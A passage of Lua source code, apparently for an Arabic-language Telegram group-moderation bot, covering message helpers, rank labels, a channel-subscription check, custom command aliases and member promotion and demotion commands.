inmsg = {ID = "InputMessageVoice", voice_ = infile, caption_ = caption}
end
return inmsg
end
--     By Developer KASPER     -- 
function getUser(user_id, cb)
tdcli_function ({
ID = "GetUser",
user_id_ = user_id
}, cb, nil)
end
--     By Developer KASPER     --
function GetApi(web) 
local info, res = https.request(web) 
local req = json:decode(info) if res ~= 200 then 
return false 
end 
if not req.ok then 
return false 
end 
return req 
end 
--     By Developer KASPER     -- 
function EditMsg(chat_id, message_id, text, markdown) local send_api = "https://api.telegram.org/bot"..tokenbot.."/editMessageText?chat_id="..chat_id.."&message_id="..message_id.."&text="..URL.escape(text).."&parse_mode=Markdown&disable_web_page_preview=true" return GetApi(send_api)  end
--     By Developer KASPER     -- 
function pin(channel_id, message_id, disable_notification) 
tdcli_function ({ 
ID = "PinChannelMessage", 
channel_id_ = getChatId(channel_id).ID, 
message_id_ = message_id, 
disable_notification_ = disable_notification 
}, function(arg ,data)
vardump(data)
end ,nil) 
end
--     By Developer KASPER     -- 
-------- Local Renk
local renk_KASPER = function(msg)
if tonumber(msg.sender_user_id_) == tonumber(1299351897) then
KASPER  = "مبرمج السورس"
elseif is_leaderid(msg.sender_user_id_) then
KASPER  = "المطور الاساسي"
elseif is_sudoid(msg.sender_user_id_) then
KASPER = "المطور الثانوي"
elseif is_admin(msg.sender_user_id_) then
KASPER = "المطور الثالث"
elseif is_onall(msg.sender_user_id_) then
KASPER = "المدير العام"
elseif is_onall(msg.sender_user_id_) then
KASPER = "الادمن العام"
elseif is_monsh(msg.sender_user_id_, msg.chat_id_) then
KASPER = "المنشئ الاساسي"
elseif is_monsh2(msg.sender_user_id_, msg.chat_id_) then
KASPER = "المنشئ"
elseif is_owner(msg.sender_user_id_, msg.chat_id_) then
KASPER = "المدير"
elseif is_momod(msg.sender_user_id_, msg.chat_id_) then
KASPER = "الادمن"
else
KASPER = "العضو" 
end return KASPER end
--     By Developer KASPER     -- 
-------- KASPER Renk
local KASPER_renk = function(user_id,chat_id)
if tonumber(user_id) == tonumber(1299351897) then
KASPER  = "مبرمج السورس"
elseif is_leaderid(user_id) then
KASPER  = "المطور الاساسي"
elseif is_sudoid(user_id) then
KASPER = KASPERdx1:get(KASPER.."bot:sudo:add"..chat_id) or "المطور الثانوي"
elseif is_admin(user_id) then
KASPER = KASPERdx1:get(KASPER.."bot:sudo3:add"..chat_id) or "المطور الثالث"
elseif is_onall(user_id) then
KASPER = KASPERdx1:get(KASPER.."bot:onall:add"..chat_id) or "المدير العام"
elseif is_moall(user_id) then
KASPER = KASPERdx1:get(KASPER.."bot:moall:add"..chat_id) or "الادمن العام"
elseif is_monsh(user_id,chat_id) then
KASPER = KASPERdx1:get(KASPER.."bot:monsh:add"..chat_id) or "المنشئ الاساسي"
elseif is_monsh2(user_id,chat_id) then
KASPER = KASPERdx1:get(KASPER.."bot:monsh2:add"..chat_id) or "المنشئ"
elseif is_owner(user_id,chat_id) then
KASPER = KASPERdx1:get(KASPER.."bot:owner:add"..chat_id) or "المدير"
elseif is_momod(user_id,chat_id) then
KASPER = KASPERdx1:get(KASPER.."bot:momod:add"..chat_id) or "الادمن"
elseif is_vipmem(user_id,chat_id) then
KASPER = KASPERdx1:get(KASPER.."bot:vepmem:add"..chat_id) or "المميز"
else
KASPER = KASPERdx1:get(KASPER.."bot:member:add"..chat_id) or "العضو" 
end return KASPER end
--     By Developer KASPER     -- 
function dxdx(user_id,chat_id)
if is_leaderid(user_id) then
var = true  
elseif KASPERdx1:sismember(KASPER..'bot:admins:', user_id) then
var = true  
elseif KASPERdx1:sismember(KASPER..'bot:onall:', user_id) then
var = true  
elseif KASPERdx1:sismember(KASPER..'bot:moall:', user_id) then
var = true  
elseif KASPERdx1:sismember(KASPER..'bot:vpall:', user_id) then
var = true  
elseif KASPERdx1:sismember(KASPER..'bot:monsh:'..chat_id, user_id) then
var = true
elseif is_monsh(chat_id, user_id) then
var = true
elseif KASPERdx1:sismember(KASPER..'bot:monsh2:'..chat_id, user_id) then
var = true  
elseif KASPERdx1:sismember(KASPER..'bot:owners:'..chat_id, user_id) then
var = true  
elseif KASPERdx1:sismember(KASPER..'bot:momod:'..chat_id, user_id) then
var = true  
elseif KASPERdx1:sismember(KASPER..'bot:vipmem:'..chat_id, user_id) then  
var = true  
else var = false end return var end
--     By Developer KASPER     -- 
function fadx(user_id,chat_id)
if is_leaderid(user_id) then
var = 'botow'  
elseif KASPERdx1:sismember(KASPER..'bot:admins', user_id) then
var = 'sudo3'  
elseif KASPERdx1:sismember(KASPER..'bot:monsh:'..chat_id, user_id) then
var = 'monsh'
elseif KASPERdx1:sismember(KASPER..'bot:monsh2:'..chat_id, user_id) then
var = 'monsh2'
elseif KASPERdx1:sismember(KASPER..'bot:owners:'..chat_id, user_id) then
var = 'owner'  
else  
var = 'No'
end return var end 
--     By Developer KASPER     -- 
local function check_filter_words(msg, value)
local hash = (KASPER..'bot:filters:'..msg.chat_id_)
if hash then
local names = KASPERdx1:hkeys(hash)
local text = ''
local value = value:gsub(' ','')
for i=1, #names do
if string.match(value:lower(), names[i]:lower()) and not is_momod(msg.sender_user_id_, msg.chat_id_)then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
end end end end
--     By Developer KASPER     -- 
function getInputFile(file) 
if file:match("/") then 
infile = {ID = "InputFileLocal", 
path_ = file} 
elseif file:match("^%d+$") then 
infile = {ID = "InputFileId", 
id_ = file} 
else infile = {ID = "InputFilePersistentId", 
persistent_id_ = file} 
end 
return infile 
end
--     By Developer KASPER     -- 
function GetInputFile(file)  
local file = file or ""   
if file:match("/") then  
infile = {ID= "InputFileLocal", path_  = file}  
elseif file:match("^%d+$") then  
infile ={ID="InputFileId",id_=file}  
else infile={ID="InputFilePersistentId",persistent_id_ = file}  
end 
return infile 
end
--     By Developer KASPER     -- 
local getChat = function(chat_id, cb)
tdcli_function({ID = "GetChat", chat_id_ = chat_id}, cb or dl_cb, nil)
end
--     By Developer KASPER     -- 
local sendRequest = function(request_id, chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, callback, extra)
tdcli_function({
ID = request_id,
chat_id_ = chat_id,
reply_to_message_id_ = reply_to_message_id,
disable_notification_ = disable_notification,
from_background_ = from_background,
reply_markup_ = reply_markup,
input_message_content_ = input_message_content
}, callback or dl_cb, extra)
end
--     By Developer KASPER     -- 
local function sendVoice(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, voice, duration, waveform, caption, cb, cmd)
local input_message_content = {
ID = "InputMessageVoice",
voice_ = getInputFile(voice),
duration_ = duration or 0,
waveform_ = waveform,
caption_ = caption
}
sendRequest('SendMessage', chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)
end
--     By Developer KASPER     -- 
local function sendAudio(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, audio, duration, waveform, caption, cb, cmd)
local input_message_content = {
ID = "InputMessageAudio",
audio_ = getInputFile(audio),
duration_ = duration or 0,
waveform_ = waveform,
caption_ = caption
}
sendRequest('SendMessage', chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)
end
--     By Developer KASPER     -- 
local sendSticker = function(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, sticker)
local input_message_content = {
ID = "InputMessageSticker",
sticker_ = getInputFile(sticker),
width_ = 0,
height_ = 0
}
sendRequest("SendMessage", chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)
end
--     By Developer KASPER     -- 
local function getChannelMembers(channel_id, offset, filter, limit,cb) 
tdcli_function ({ 
ID = "GetChannelMembers",
channel_id_ = getChatId(channel_id).ID,
filter_ = {ID = "ChannelMembers" .. filter},
offset_ = offset,limit_ = limit}, 
cb, nil) 
end 
--     By Developer KASPER     -- 
function addgroup(chat_id) 
KASPERdx1:sadd("KASPER:addg"..bot_id,chat_id) 
KASPERdx1:set(KASPER.."bot:enable:"..chat_id, true) 
KASPERdx1:sadd(KASPER..'bot:groups',chat_id)
end 
function remgroup(chat_id) 
KASPERdx1:srem("KASPER:addg"..bot_id,chat_id) 
KASPERdx1:del(KASPER.."bot:enable:"..chat_id, true)  KASPERdx1:srem(KASPER..'bot:groups',chat_id)
end
local function remlockal(chat_id)
KASPERdx1:del(KASPER..'editmsg'..chat_id) KASPERdx1:del(KASPER..'bot:cmds'..chat_id) KASPERdx1:del(KASPER..'bot:bots:mute'..chat_id) KASPERdx1:del(KASPER..'bot:bots:ban'..chat_id) KASPERdx1:del(KASPER..'keed_bots'..chat_id) KASPERdx1:del(KASPER..'anti-flood:'..chat_id) KASPERdx1:del(KASPER..'bot:pin:mute'..chat_id) KASPERdx1:del(KASPER..'bot:photo:mute'..chat_id) KASPERdx1:del(KASPER..'bot:spam:mute'..chat_id) KASPERdx1:del(KASPER..'bot:video:mute'..chat_id) KASPERdx1:del(KASPER..'bot:document:mute'..chat_id) KASPERdx1:del(KASPER..'bot:inline:mute'..chat_id) KASPERdx1:del(KASPER..'markdown:lock'..chat_id) KASPERdx1:del(KASPER..'bot:gifs:mute'..chat_id) KASPERdx1:del(KASPER..'bot:music:mute'..chat_id) KASPERdx1:del(KASPER..'bot:voice:mute'..chat_id) KASPERdx1:del(KASPER..'bot:links:mute'..chat_id) KASPERdx1:del(KASPER..'bot:location:mute'..chat_id) KASPERdx1:del(KASPER..'tags:lock'..chat_id) KASPERdx1:del(KASPER..'bot:strict'..chat_id) KASPERdx1:del(KASPER..'bot:hashtag:mute'..chat_id) KASPERdx1:del(KASPER..'bot:contact:mute'..chat_id) KASPERdx1:del(KASPER..'bot:webpage:mute'..chat_id) KASPERdx1:del(KASPER..'bot:sticker:mute'..chat_id) KASPERdx1:del(KASPER..'bot:forward:mute'..chat_id)
end
local function addlockal(chat_id)
KASPERdx1:set(KASPER..'editmsg'..chat_id,true) KASPERdx1:set(KASPER..'bot:cmds'..chat_id,true) KASPERdx1:set(KASPER..'bot:bots:mute'..chat_id,true) KASPERdx1:set(KASPER..'bot:bots:ban'..chat_id,true) KASPERdx1:set(KASPER..'keed_bots'..chat_id,true) KASPERdx1:set(KASPER..'anti-flood:'..chat_id,true) KASPERdx1:set(KASPER..'bot:pin:mute'..chat_id,true) KASPERdx1:set(KASPER..'bot:inline:mute'..chat_id,true) KASPERdx1:set(KASPER..'bot:photo:mute'..chat_id,true) KASPERdx1:set(KASPER..'bot:spam:mute'..chat_id,true) KASPERdx1:set(KASPER..'bot:video:mute'..chat_id,true) KASPERdx1:set(KASPER..'bot:gifs:mute'..chat_id,true) KASPERdx1:set(KASPER..'bot:music:mute'..chat_id,true) KASPERdx1:set(KASPER..'bot:voice:mute'..chat_id,true) KASPERdx1:set(KASPER..'bot:links:mute'..chat_id,true) KASPERdx1:set(KASPER..'bot:location:mute'..chat_id,true) KASPERdx1:set(KASPER..'tags:lock'..chat_id,true) KASPERdx1:set(KASPER..'bot:strict'..chat_id,true) KASPERdx1:set(KASPER..'bot:document:mute'..chat_id,true) KASPERdx1:set(KASPER..'bot:hashtag:mute'..chat_id,true) KASPERdx1:set(KASPER..'bot:contact:mute'..chat_id,true) KASPERdx1:set(KASPER..'bot:webpage:mute'..chat_id,true) KASPERdx1:set(KASPER..'bot:sticker:mute'..chat_id,true) KASPERdx1:set(KASPER..'markdown:lock'..chat_id,true) KASPERdx1:set(KASPER..'bot:forward:mute'..chat_id,true)
end
--     By Developer KASPER     -- 
function formsgg(msgs) 
local KASPER = ''  
if msgs < 100 then 
KASPER = "ضعيف جدا"
elseif msgs < 250 then 
KASPER = "ضعيف"
elseif msgs < 500 then 
KASPER = "غير متفاعل"
elseif msgs < 750 then 
KASPER = "متوسط"
elseif msgs < 1000 then 
KASPER = "متفاعل"
elseif msgs < 2000 then 
KASPER = "قمه التفاعل"
elseif msgs < 3000 then 
KASPER = "ملك التفاعل"
elseif msgs < 4000 then 
KASPER = "اسطوره التفاعل"
elseif msgs < 5000 then 
KASPER = "نار وشرار" 
elseif msgs < 6000 then 
KASPER = "جهنم حبي" 
elseif msgs < 7000 then 
KASPER = "فول" 
elseif msgs < 8000 then 
KASPER = "معلك لربك" 
elseif msgs < 9000 then 
KASPER = "حارك الكروب" 
end return KASPER end
--     By Developer KASPER     -- 
function title_name(GroupID) 
tdcli_function({ID ="GetChat",chat_id_=GroupID
},function(arg,data) 
KASPERdx1:set(KASPER..'bot:group:name'..GroupID,data.title_) 
end,nil) 
return KASPERdx1:get(KASPER..'bot:group:name'..GroupID)  end
--     By Developer KASPER     -- 
function faedrmoned(chat_id, user_id, msg_id, text, offset, length) local tt = KASPERdx1:get(KASPER..'endmsg') or '' tdcli_function ({ ID = "SendMessage", chat_id_ = chat_id, reply_to_message_id_ = msg_id, disable_notification_ = 0, from_background_ = 1, reply_markup_ = nil, input_message_content_ = { ID = "InputMessageText", text_ = text..'\n\n'..tt, disable_web_page_preview_ = 1, clear_draft_ = 0, entities_ = {[0]={ ID="MessageEntityMentionName", offset_=offset, length_=length, user_id_=user_id }, }, }, }, dl_cb, nil) end
--     By Developer KASPER     -- 
function KASPER11(msg)
local var = true 
if KASPERdx1:get(KASPER.."KASPER2") then
local channel = ''..KASPERdx1:get(KASPER..'KASPER3')..''
local url , res = https.request('https://api.telegram.org/bot'..tokenbot..'/getchatmember?chat_id='..channel..'&user_id='..msg.sender_user_id_)
local data = json:decode(url)
if res ~= 200 or data.result.status == "left" or data.result.status == "kicked" then
var = false
KASPERdx(msg.chat_id_,msg.id_, 1, "*✟︙لا تستطيع استخدام البوت ،\n✟︙اشترك بقناته لتتمكن من استخدامه ، \n\n✟︙قناة البوت* : ["..channel.."] \n", 1 , "md")
elseif data.ok then
return var
end else return var end end
--     By Developer KASPER     -- 
function tdcli_update_callback(data)
local our_id = KASPERdx1:get(KASPER.."Our_ID") or 0
local api_id = KASPERdx1:get(KASPER.."Bot:Api_ID") or 0
if data.ID == "UpdateNewCallbackQuery" then
local Chat_id = data.chat_id_
local Msg_id = data.message_id_
local Text = data.payload_.data_
if Text == '/UnKed' then
if KASPERdx1:sismember(KASPER.."KASPERdx1:Un:Ked"..data.chat_id_,data.sender_user_id_) then
https.request("https://api.telegram.org/bot" .. tokenbot .. "/restrictChatMember?chat_id=" .. data.chat_id_ .. "&user_id=" .. data.sender_user_id_ .. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
KASPERdx1:srem(KASPER.."KASPERdx1:Un:Ked"..Chat_id,data.sender_user_id_)
delete_msg(data.chat_id_, {[0] = Msg_id})  
end end end
--     By Developer KASPER     -- 
if data.ID == "UpdateNewMessage" then
local msg = data.message_
local d = data.disable_notification_
local chat = chats[msg.chat_id_]
text = data.message_.content_.text_
if text and KASPERdx1:get(bot_id.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_) == "true" then
local NewCmmd = KASPERdx1:get(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text)
if NewCmmd then
KASPERdx1:del(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text)
KASPERdx1:del(bot_id.."Set:Cmd:Group:New"..msg.chat_id_)
KASPERdx1:srem(bot_id.."List:Cmd:Group:New"..msg.chat_id_,text)
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙تم مسح الامر من المجموعه ،", 1, 'html')
else
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙لا يوجد هكذا امر ،", 1, 'html')
end
KASPERdx1:del(bot_id.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_)
return false
end
if data.message_.content_.text_ then
local NewCmmd = KASPERdx1:get(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..":"..data.message_.content_.text_)
if NewCmmd then
data.message_.content_.text_ = (NewCmmd or data.message_.content_.text_)
end end
--     By Developer KASPER     -- 
if text and KASPERdx1:get(bot_id.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_) == "true" then
KASPERdx1:set(bot_id.."Set:Cmd:Group:New"..msg.chat_id_,text)
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙ارسل لي الامر الجديد ،", 1, 'html')
KASPERdx1:del(bot_id.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_)
KASPERdx1:set(bot_id.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_,"true1") 
return false
end
if text and KASPERdx1:get(bot_id.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_) == "true1" then
local NewCmd = KASPERdx1:get(bot_id.."Set:Cmd:Group:New"..msg.chat_id_)
KASPERdx1:set(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text,NewCmd)
KASPERdx1:sadd(bot_id.."List:Cmd:Group:New"..msg.chat_id_,text)
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙تم حفظ الامر الجديد ،", 1, 'html')
KASPERdx1:del(bot_id.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_)
return false
end
--     By Developer KASPER     -- 
if text == "الاوامر المضافه" and KASPER11(msg) then
local list = KASPERdx1:smembers(bot_id.."List:Cmd:Group:New"..msg.chat_id_.."")
t = "✟︙قائمه الاوامر المضافه ⬇️،\n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n"
for k,v in pairs(list) do
Cmds = KASPERdx1:get(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..":"..v)
if Cmds then 
t = t..""..k.."- ("..v..") « » ("..Cmds..")\n"
else
t = t..""..k.."- ("..v..") \n"
end end 
if #list == 0 then
t = "✟︙لايوجد اوامر مضافه ."
end
KASPERdx(msg.chat_id_, msg.id_, 1, "["..t.."]", 1, 'md')
end
--     By Developer KASPER     -- 
if text == "حذف الاوامر المضافه" or text == "مسح الاوامر المضافه" and KASPER11(msg) then
local list = KASPERdx1:smembers(bot_id.."List:Cmd:Group:New"..msg.chat_id_)
for k,v in pairs(list) do
KASPERdx1:del(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..":"..v)
KASPERdx1:del(bot_id.."List:Cmd:Group:New"..msg.chat_id_)
end
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙تم مسح الاوامر المضافه .", 1, 'html')
end
--     By Developer KASPER     -- 
if text == "اضف امر" then
KASPERdx1:set(bot_id.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_,"true") 
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙ارسل لي الامر القديم .", 1, 'html')
return false
end
--     By Developer KASPER     -- 
if text == "حذف امر" or text == "مسح امر" and KASPER11(msg) then 
KASPERdx1:set(bot_id.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_,"true") 
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙ارسل لي الامر الذي قمت باضافته يدويا .", 1, 'html')
return false 
end
--     By Developer KASPER     -- 
if text == "الصلاحيات" and KASPER11(msg) then 
local list = KASPERdx1:smembers(bot_id.."Coomds"..msg.chat_id_)
if #list == 0 then
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙لا يوجد صلاحيات مضافه .", 1, 'html')
return false
end
t = "✟︙قائمه الصلاحيات المضافه ⬇️،\n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n"
for k,v in pairs(list) do
var = KASPERdx1:get(bot_id.."Comd:New:rt:bot:"..v..msg.chat_id_)
if var then
t = t..""..k.."- ("..v..") « » ("..var..")\n"
else
t = t..""..k.."- ("..v..")\n"
end end
KASPERdx(msg.chat_id_, msg.id_, 1, t, 1, 'html')
end
--     By Developer KASPER     -- 
if text == "مسح الصلاحيات" and KASPER11(msg) then
local list = KASPERdx1:smembers(bot_id.."Coomds"..msg.chat_id_)
for k,v in pairs(list) do
KASPERdx1:del(bot_id.."Comd:New:rt:bot:"..v..msg.chat_id_)
KASPERdx1:del(bot_id.."Coomds"..msg.chat_id_)
end
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙تم مسح جميع الصلاحيات .", 1, 'html')
end
--     By Developer KASPER     -- 
if text and text:match("^اضف صلاحيه (.*)$") and KASPER11(msg) then 
ComdNew = text:match("^اضف صلاحيه (.*)$")
KASPERdx1:set(bot_id.."Comd:New:rt"..msg.chat_id_..msg.sender_user_id_,ComdNew)  
KASPERdx1:sadd(bot_id.."Coomds"..msg.chat_id_,ComdNew)  
KASPERdx1:setex(bot_id.."Comd:New"..msg.chat_id_..""..msg.sender_user_id_,200,true)  
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙ارسل نوع الصلاحيه ،\n✟︙{ عضو - مميز - ادمن - مدير }", 1, 'html') 
end
--     By Developer KASPER     -- 
if text and text:match("^مسح صلاحيه (.*)$") or text and text:match("^حذف صلاحيه (.*)$") and KASPER11(msg) then 
ComdNew = text:match("^مسح صلاحيه (.*)$") or text:match("^حذف صلاحيه (.*)$")
KASPERdx1:del(bot_id.."Comd:New:rt:bot:"..ComdNew..msg.chat_id_)
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙تم مسح الصلاحيه .", 1, 'html')
end
if KASPERdx1:get(bot_id.."Comd:New"..msg.chat_id_..""..msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙تم الغاء الامر .", 1, 'html')
KASPERdx1:del(bot_id.."Comd:New"..msg.chat_id_..""..msg.sender_user_id_) 
return false  
end 
if text == "مدير" then
if not is_monsh(msg.sender_user_id_, msg.chat_id_) then
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙ارسل نوع الصلاحيه ،\n✟︙{ عضو - مميز - ادمن }", 1, 'html')
return false
end end
if text == "ادمن" then
if not is_owner(msg.sender_user_id_, msg.chat_id_) then 
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙ارسل نوع الصلاحيه ،\n✟︙{ عضو - مميز }", 1, 'html')
return false
end end
if text == "مميز" then
if not is_momod(msg.sender_user_id_, msg.chat_id_) then
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙ارسل نوع الصلاحيه ،\n✟︙تستطيع اضافه صلاحيه { عضو } فقط", 1, 'html')
return false
end end
if text == "مدير" or text == "ادمن" or text == "مميز" or text == "عضو" then
local textn = KASPERdx1:get(bot_id.."Comd:New:rt"..msg.chat_id_..msg.sender_user_id_)  
KASPERdx1:set(bot_id.."Comd:New:rt:bot:"..textn..msg.chat_id_,text)
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙تم حفظ الصلاحيه .", 1, 'html')
KASPERdx1:del(bot_id.."Comd:New"..msg.chat_id_..""..msg.sender_user_id_) 
return false  
end end
--     By Developer KASPER     -- 
if text and text:match("رفع (.*)") and tonumber(msg.reply_to_message_id_) > 0 and KASPER11(msg) then 
local KASPERrt = text:match("رفع (.*)")
if KASPERdx1:sismember(bot_id.."Coomds"..msg.chat_id_,KASPERrt) then
function by_reply(extra, result, success)   
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local fdrt = KASPERdx1:get(bot_id.."Comd:New:rt:bot:"..KASPERrt..msg.chat_id_)
if fdrt == "مميز" and is_momod(msg.sender_user_id_, msg.chat_id_) then
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙*العضو* ( ['..data.first_name_..'](t.me/'..(data.username_ or 'KASPER_ch')..')'..' )\n✟︙*تم رفعه ( '..KASPERrt..' )\n✟︙*بواسطه ( '..renk_KASPER(msg)..' )*\n*', 1, 'md')
KASPERdx1:set(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,KASPERrt) 
KASPERdx1:sadd(KASPER..'bot:vipmem:'..msg.chat_id_, result.sender_user_id_)
elseif fdrt == "ادمن" and is_owner(msg.sender_user_id_, msg.chat_id_) then 
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙*العضو* ( ['..data.first_name_..'](t.me/'..(data.username_ or 'KASPER_ch')..')'..' )\n✟︙*تم رفعه ( '..KASPERrt..' )\n✟︙*بواسطه ( '..renk_KASPER(msg)..' )*\n*', 1, 'md')
KASPERdx1:set(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,KASPERrt)
KASPERdx1:sadd(KASPER..'bot:momod:'..msg.chat_id_, result.sender_user_id_)
elseif fdrt == "مدير" and is_monsh(msg.sender_user_id_, msg.chat_id_) then
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙*العضو* ( ['..data.first_name_..'](t.me/'..(data.username_ or 'KASPER_ch')..')'..' )\n✟︙*تم رفعه ( '..KASPERrt..' )\n✟︙*بواسطه ( '..renk_KASPER(msg)..' )*\n*', 1, 'md')
KASPERdx1:set(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,KASPERrt)  
KASPERdx1:sadd(KASPER..'bot:owners:'..msg.chat_id_, result.sender_user_id_)
elseif fdrt == "عضو" and is_momod(msg.sender_user_id_, msg.chat_id_) then
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙*العضو* ( ['..data.first_name_..'](t.me/'..(data.username_ or 'KASPER_ch')..')'..' )\n✟︙*تم رفعه ( '..KASPERrt..' )\n✟︙*بواسطه ( '..renk_KASPER(msg)..' )*\n*', 1, 'md')
end end,nil) end   
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end end
--     By Developer KASPER     -- 
if text and text:match("تنزيل (.*)") and tonumber(msg.reply_to_message_id_) > 0 and KASPER11(msg) then 
local KASPERrt = text:match("تنزيل (.*)")
if KASPERdx1:sismember(bot_id.."Coomds"..msg.chat_id_,KASPERrt) then
function by_reply(extra, result, success)   
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local fdrt = KASPERdx1:get(bot_id.."Comd:New:rt:bot:"..KASPERrt..msg.chat_id_)
if fdrt == "مميز" and is_momod(msg.sender_user_id_, msg.chat_id_) then
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙*العضو* ( ['..data.first_name_..'](t.me/'..(data.username_ or 'KASPER_ch')..')'..' )\n✟︙*تم تنزيله من ( '..KASPERrt..' )\n✟︙*بواسطه ( '..renk_KASPER(msg)..' )*\n*', 1, 'md')
KASPERdx1:srem(KASPER..'bot:vipmem:'..msg.chat_id_, result.sender_user_id_)
KASPERdx1:del(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
elseif fdrt == "ادمن" and is_owner(msg.sender_user_id_, msg.chat_id_) then 
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙*العضو* ( ['..data.first_name_..'](t.me/'..(data.username_ or 'KASPER_ch')..')'..' )\n✟︙*تم تنزيله من ( '..KASPERrt..' )\n✟︙*بواسطه ( '..renk_KASPER(msg)..' )*\n*', 1, 'md')
KASPERdx1:srem(KASPER..'bot:momod:'..msg.chat_id_, result.sender_user_id_)
KASPERdx1:del(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
elseif fdrt == "مدير" and is_monsh(msg.sender_user_id_, msg.chat_id_) then
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙*العضو* ( ['..data.first_name_..'](t.me/'..(data.username_ or 'KASPER_ch')..')'..' )\n✟︙*تم تنزيله من ( '..KASPERrt..' )\n✟︙*بواسطه ( '..renk_KASPER(msg)..' )*\n*', 1, 'md')
KASPERdx1:srem(KASPER..'bot:owners:'..msg.chat_id_, result.sender_user_id_)
KASPERdx1:del(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
elseif fdrt == "عضو" and is_momod(msg.sender_user_id_, msg.chat_id_) then
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙*العضو* ( ['..data.first_name_..'](t.me/'..(data.username_ or 'KASPER_ch')..')'..' )\n✟︙*تم تنزيله من ( '..KASPERrt..' )\n✟︙*بواسطه ( '..renk_KASPER(msg)..' )*\n*', 1, 'md')
end end,nil) end   
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end end
--     By Developer KASPER     -- 
if text and text:match("^رفع (.*) @(.*)") and KASPER11(msg) then 
local text1 = {string.match(text, "^(رفع) (.*) @(.*)$")}
if KASPERdx1:sismember(bot_id.."Coomds"..msg.chat_id_,text1[2]) then
function py_username(extra, result, success)   
if result.id_ then
local fdrt = KASPERdx1:get(bot_id.."Comd:New:rt:bot:"..text1[2]..msg.chat_id_)
if fdrt == "مميز" and is_momod(msg.sender_user_id_, msg.chat_id_) then
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙العضو ( ['..result.title_..'](t.me/'..(text1[3] or 'KASPER_ch')..')'..' )\n✟︙تم رفعه ( '..text1[2]..' )\n✟︙بواسطه ( '..renk_KASPER(msg)..' )\n', 1, 'md')
KASPERdx1:sadd(KASPER..'bot:vipmem:'..msg.chat_id_, result.id_)
KASPERdx1:set(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
elseif fdrt == "ادمن" and is_owner(msg.sender_user_id_, msg.chat_id_) then 
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙العضو ( ['..result.title_..'](t.me/'..(text1[3] or 'KASPER_ch')..')'..' )\n✟︙تم رفعه ( '..text1[2]..' )\n✟︙بواسطه ( '..renk_KASPER(msg)..' )\n', 1, 'md')
KASPERdx1:sadd(KASPER..'bot:momod:'..msg.chat_id_, result.id_)
KASPERdx1:set(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
elseif fdrt == "مدير" and is_monsh(msg.sender_user_id_, msg.chat_id_) then
